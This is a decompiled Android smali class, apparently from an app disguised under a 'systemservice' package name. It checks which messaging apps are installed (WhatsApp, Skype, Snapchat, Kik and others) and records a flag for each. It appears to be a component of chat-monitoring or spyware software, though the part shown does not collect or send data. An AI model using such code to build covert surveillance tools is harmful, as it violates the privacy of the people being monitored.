.class public Lcom/systemservice/a/g/a;
.super Ljava/lang/Object;
.source ""


# direct methods
.method public static a(Landroid/content/Context;)V
    .locals 25

    :try_start_0
    const-string v0, "app_prefs_settings"

    const/4 v1, 0x0

    move-object/from16 v2, p0

    invoke-virtual {v2, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {v2, v1}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v2

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    const/4 v12, 0x0

    const/4 v13, 0x0

    :goto_0
    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v14
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v15, "is_snapchat_installed"

    const-string v1, "is_kik_installed"

    move/from16 p0, v13

    const-string v13, "is_line_installed"

    move/from16 v16, v12

    const-string v12, "is_bbm_installed"

    move/from16 v17, v11

    const-string v11, "is_skype_installed"

    move/from16 v18, v10

    const-string v10, "is_hangout_installed"

    move/from16 v19, v9

    const-string v9, "is_facebook_installed"

    move/from16 v20, v8

    const-string v8, "is_yahoo_installed"

    move/from16 v21, v7

    const-string v7, "is_viber_installed"

    move/from16 v22, v6

    const-string v6, "is_whatsapp_installed"

    if-ge v3, v14, :cond_a

    :try_start_1
    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v14

    check-cast v14, Landroid/content/pm/PackageInfo;

    iget-object v14, v14, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    move-object/from16 v23, v2

    const-string v2, "com.whatsapp"

    invoke-virtual {v14, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    move/from16 v24, v5

    const/4 v5, 0x1

    if-eqz v2, :cond_0

    invoke-interface {v0, v6, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    move/from16 v13, p0

    move/from16 v12, v16

    move/from16 v11, v17

    move/from16 v10, v18

    move/from16 v9, v19

    move/from16 v8, v20

    move/from16 v7, v21

    move/from16 v6, v22

    move/from16 v5, v24

    const/4 v4, 0x1

    goto/16 :goto_1

    :cond_0
    const-string v2, "com.viber.voip"

    invoke-virtual {v14, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-interface {v0, v7, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move/from16 v13, p0

    move/from16 v12, v16

    move/from16 v11, v17

    move/from16 v10, v18

    move/from16 v9, v19

    move/from16 v8, v20

    move/from16 v7, v21

    move/from16 v6, v22

    goto/16 :goto_1

    :cond_1
    const-string v2, "com.yahoo.mobile.client.android.im"

    invoke-virtual {v14, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-interface {v0, v8, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move/from16 v13, p0

    move/from16 v12, v16

    move/from16 v11, v17

    move/from16 v10, v18

    move/from16 v9, v19

    move/from16 v8, v20

    move/from16 v7, v21

    move/from16 v5, v24

    const/4 v6, 0x1

    goto/16 :goto_1

    :cond_2
    const-string v2, "com.facebook.orca"

    invoke-virtual {v14, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    invoke-interface {v0, v9, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move/from16 v13, p0

    move/from16 v12, v16

    move/from16 v11, v17

    move/from16 v10, v18

    move/from16 v9, v19

    move/from16 v8, v20

    move/from16 v6, v22

    move/from16 v5, v24

    const/4 v7, 0x1

    goto/16 :goto_1

    :cond_3
    const-string v2, "com.google.android.talk"

    invoke-virtual {v14, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_4

    invoke-interface {v0, v10, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move/from16 v13, p0

    move/from16 v12, v16

    move/from16 v11, v17

    move/from16 v10, v18

    move/from16 v9, v19

    move/from16 v7, v21

    move/from16 v6, v22

    move/from16 v5, v24

    const/4 v8, 0x1

    goto/16 :goto_1

    :cond_4
    const-string v2, "jp.naver.line.android"

    invoke-virtual {v14, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_5

    invoke-interface {v0, v13, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move/from16 v13, p0

    move/from16 v12, v16

    move/from16 v10, v18

    move/from16 v9, v19

    move/from16 v8, v20

    move/from16 v7, v21

    move/from16 v6, v22

    move/from16 v5, v24

    const/4 v11, 0x1

    goto/16 :goto_1

    :cond_5
    const-string v2, "com.skype.raider"

    invoke-virtual {v14, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_6

    invoke-interface {v0, v11, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move/from16 v13, p0

    move/from16 v12, v16

    move/from16 v11, v17

    move/from16 v10, v18

    move/from16 v8, v20

    move/from16 v7, v21

    move/from16 v6, v22

    move/from16 v5, v24

    const/4 v9, 0x1

    goto/16 :goto_1

    :cond_6
    const-string v2, "com.bbm"

    invoke-virtual {v14, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    invoke-interface {v0, v12, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move/from16 v13, p0

    move/from16 v12, v16

    move/from16 v11, v17

    move/from16 v9, v19

    move/from16 v8, v20

    move/from16 v7, v21

    move/from16 v6, v22

    move/from16 v5, v24

    const/4 v10, 0x1

    goto :goto_1

    :cond_7
    const-string v2, "kik.android"

    invoke-virtual {v14, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_8

    invoke-interface {v0, v1, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move/from16 v13, p0

    move/from16 v11, v17

    move/from16 v10, v18

    move/from16 v9, v19

    move/from16 v8, v20

    move/from16 v7, v21

    move/from16 v6, v22

    move/from16 v5, v24

    const/4 v12, 0x1

    goto :goto_1

    :cond_8
    const-string v1, "com.snapchat.android"

    invoke-virtual {v14, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_9

    invoke-interface {v0, v15, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move/from16 v12, v16

    move/from16 v11, v17

    move/from16 v10, v18

    move/from16 v9, v19

    move/from16 v8, v20

    move/from16 v7, v21

    move/from16 v6, v22

    move/from16 v5, v24

    const/4 v13, 0x1

    goto :goto_1

    :cond_9
    move/from16 v13, p0

    move/from16 v12, v16

    move/from16 v11, v17

    move/from16 v10, v18

    move/from16 v9, v19

    move/from16 v8, v20

    move/from16 v7, v21

    move/from16 v6, v22

    move/from16 v5, v24

    :goto_1
    add-int/lit8 v3, v3, 0x1

    move-object/from16 v2, v23

    const/4 v1, 0x0

    goto/16 :goto_0

    :cond_a
    move/from16 v24, v5

    if-nez v4, :cond_b

    const/4 v2, 0x0

    invoke-interface {v0, v6, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_b
    if-nez v24, :cond_c

    const/4 v2, 0x0

    invoke-interface {v0, v7, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_c
    if-nez v22, :cond_d

    const/4 v2, 0x0

    invoke-interface {v0, v8, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_d
    if-nez v21, :cond_e

    const/4 v2, 0x0

    invoke-interface {v0, v9, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_e
    if-nez v20, :cond_f

    const/4 v2, 0x0

    invoke-interface {v0, v10, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_f
    if-nez v19, :cond_10

    const/4 v2, 0x0

    invoke-interface {v0, v11, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_10
    if-nez v18, :cond_11

    const/4 v2, 0x0

    invoke-interface {v0, v12, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_11
    if-nez v17, :cond_12

    const/4 v2, 0x0

    invoke-interface {v0, v13, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_12
    if-nez v16, :cond_13

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_13
    if-nez p0, :cond_14

    const/4 v1, 0x0

    invoke-interface {v0, v15, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ""

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "AppChatManager"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_14
    :goto_2
    return-void
.end method
